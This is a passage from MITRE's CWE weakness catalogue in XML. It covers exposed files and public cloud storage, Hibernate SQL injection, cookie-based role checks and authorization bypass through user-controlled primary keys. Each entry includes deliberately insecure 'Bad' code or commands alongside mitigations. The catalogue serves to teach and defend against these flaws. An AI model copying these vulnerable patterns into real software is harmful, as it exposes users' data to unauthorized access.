               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Name, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2011-03-29">Information Leak Through Directory Listing</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Information Exposure Through Directory Listing</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="552" Name="Files or Directories Accessible to External Parties" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product makes files or directories accessible to unauthorized actors, even though they should not be.</Description>
	 <Extended_Description>
	   <xhtml:p>Web servers, FTP servers, and similar servers may store a set of files underneath a "root" directory that is accessible to the server's users.  Applications may store sensitive files underneath this root without also using access control to limit which users may request those files, if any.  Alternately, an application might package multiple files or directories into an archive file (e.g., ZIP or tar), but the application might not exclude sensitive files that are underneath those directories.</xhtml:p>
	   <xhtml:p>In cloud technologies and containers, this weakness might present itself in the form of public (i.e., anonymous) access being allowed/overwritten to storage accounts.</xhtml:p>
	 </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="285" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
            <Technology Class="Cloud Computing" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Files or Directories</Impact>
               <Impact>Modify Files or Directories</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Phase>System Configuration</Phase>
               <Phase>Operation</Phase>
               <Description>When storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to disable public access.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
           <Demonstrative_Example>
             <Intro_Text>The following Azure command updates the settings for a storage account:</Intro_Text>
             <Example_Code Nature="Bad" Language="Shell">
               <xhtml:div>az storage account update --name &lt;storage-account&gt; --resource-group &lt;resource-group&gt; --allow-blob-public-access true</xhtml:div>
	     </Example_Code>
	     <Body_Text>However, "Allow Blob Public Access" is set to true, meaning that anonymous/public users can access blobs.</Body_Text>
	     <Body_Text>The command could be modified to disable "Allow Blob Public Access" by setting it to false.</Body_Text>
             <Example_Code Nature="Good" Language="Shell">
               <xhtml:div>az storage account update --name &lt;storage-account&gt; --resource-group &lt;resource-group&gt; --allow-blob-public-access false</xhtml:div>
	     </Example_Code>
           </Demonstrative_Example>
         </Demonstrative_Examples>
         <Affected_Resources>
            <Affected_Resource>File or Directory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A10</Entry_ID>
               <Entry_Name>Insecure Configuration Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>FIO15-C</Entry_ID>
               <Entry_Name>Ensure that file operations are performed in a secure directory</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="150"/>
            <Related_Attack_Pattern CAPEC_ID="639"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-1307" Section="Section 3.7"/>
         </References>
         <Content_History>
            <Submission>
                <Submission_Name>CWE Community</Submission_Name>
                <Submission_Date>2006-07-19</Submission_Date>
				<Submission_Comment>Submitted by members of the CWE community to extend early CWE versions</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2010-09-09</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Affected_Resources, Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Description, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Potential_Mitigations, References</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Errant Files or Directories Accessible</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="564" Name="SQL Injection: Hibernate" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>Using Hibernate to execute a dynamic SQL statement built with user-controlled input can allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.</Description>
         <Related_Weaknesses>
             <Related_Weakness Nature="ChildOf" CWE_ID="89" View_ID="1000" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="89" View_ID="928" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="89" View_ID="1305" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Requirements</Phase>
               <Description>A non-SQL style database which is not subject to this flaw may be chosen.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Follow the principle of least privilege when creating user accounts to a SQL database. Users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Implement SQL strings using prepared statements that bind variables. Prepared statements that do not bind variables can be vulnerable to attack.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use vigorous allowlist style checking on any user input that may be used in a SQL command. Rather than escape meta-characters, it is safest to disallow them entirely. Reason: Later use of data that have been entered in the database may neglect to escape meta-characters before use. Narrowly define the set of safe characters based on the expected value of the parameter in the request.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code excerpt uses Hibernate's HQL syntax to build a dynamic query that's vulnerable to SQL injection.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String street = getStreetFromUser();<xhtml:br/>Query query = session.createQuery("from Address a where a.street='" + street + "'");</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="109"/>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="565" Name="Reliance on Cookies without Validation and Integrity Checking" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product relies on the existence or values of cookies when performing security-critical operations, but it does not properly ensure that the setting is valid for the associated user.</Description>
         <Extended_Description>Attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. Reliance on cookies without detailed validation and integrity checking can allow attackers to bypass authentication, conduct injection attacks such as SQL injection and cross-site scripting, or otherwise modify inputs in unexpected ways.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="642" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="602" View_ID="1000"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>It is dangerous to use cookies to set a user's privileges. The cookie can be manipulated to escalate an attacker's privileges to an administrative level.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Avoid using cookie data for a security-related decision.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Perform thorough input validation (i.e.: server side validation) on the cookie data if you're going to use it for a security related decision.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Add integrity checks to detect tampering.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Protect critical cookies from replay attacks, since cross-site scripting or other attacks may allow attackers to steal a strongly-encrypted cookie that also passes integrity checks. This mitigation applies to cookies that should only be valid during a single transaction or session. By enforcing timeouts, you may limit the scope of an attack. As part of your integrity check, use an unpredictable, server-side value that is not exposed to the client.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-61">
               <Intro_Text>The following code excerpt reads a value from a browser cookie to determine the role of the user.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Cookie[] cookies = request.getCookies();<xhtml:br/>for (int i =0; i&lt; cookies.length; i++) {<xhtml:div style="margin-left:1em;">Cookie c = cookies[i];<xhtml:br/>if (c.getName().equals("role")) {<xhtml:div style="margin-left:1em;">userRole = c.getValue();</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>It is easy for an attacker to modify the "role" value found in the locally stored cookie, allowing privilege escalation.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP29</Entry_ID>
               <Entry_Name>Faulty endpoint authentication</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="226"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
            <Related_Attack_Pattern CAPEC_ID="39"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">This problem can be primary to many types of weaknesses in web applications. A developer may perform proper validation against URL parameters while assuming that attackers cannot modify cookies. As a result, the program might skip basic input validation to enable cross-site scripting, SQL injection, price tampering, and other attacks..</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Other_Notes, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-16</Modification_Date>
               <Modification_Importance>Critical</Modification_Importance>
               <Modification_Comment>Clarified name and description; broadened the definition to include any security-critical operation, not just security decisions, to allow for relationships with injection weaknesses.</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description, Name, Potential_Mitigations, Relationship_Notes, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Use of Cookies</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-07-27">Use of Cookies in Security Decision</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="566" Name="Authorization Bypass Through User-Controlled SQL Primary Key" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product uses a database table that includes records that should not be accessible to an actor, but it executes a SQL statement with a primary key that can be controlled by that actor.</Description>
         <Extended_Description>
            <xhtml:p>When a user can set a primary key to any value, then the user can modify the key to point to unauthorized records.</xhtml:p>
            <xhtml:p>Database access control errors occur when:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>Data enters a program from an untrusted source.</xhtml:li>
                  <xhtml:li>The data is used to specify the value of a primary key in a SQL query.</xhtml:li>
                  <xhtml:li>The untrusted source does not have the permissions to be able to access all rows in the associated table.</xhtml:li>
               </xhtml:ul>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="639" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Technology Name="Database Server" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Access Control</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Assume all input is malicious. Use a standard input validation mechanism to validate all input for length, type, syntax, and business rules before accepting the data. Use an "accept known good" validation strategy.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use a parameterized query AND make sure that the accepted values conform to the business rules. Construct your SQL statement accordingly.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user.</Intro_Text>
               <Example_Code Nature="Bad" Language="C#">
                  <xhtml:div>...<xhtml:br/>conn = new SqlConnection(_ConnectionString);<xhtml:br/>conn.Open();<xhtml:br/>int16 id = System.Convert.ToInt16(invoiceID.Text);<xhtml:br/>SqlCommand query = new SqlCommand( "SELECT * FROM invoices WHERE id = @id", conn);<xhtml:br/>query.Parameters.AddWithValue("@id", id);<xhtml:br/>SqlDataReader objReader = objCommand.ExecuteReader();<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The problem is that the developer has not considered all of the possible values of id. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP25</Entry_ID>
               <Entry_Name>Tainted input to variable</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Other_Notes, Potential_Mitigations, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
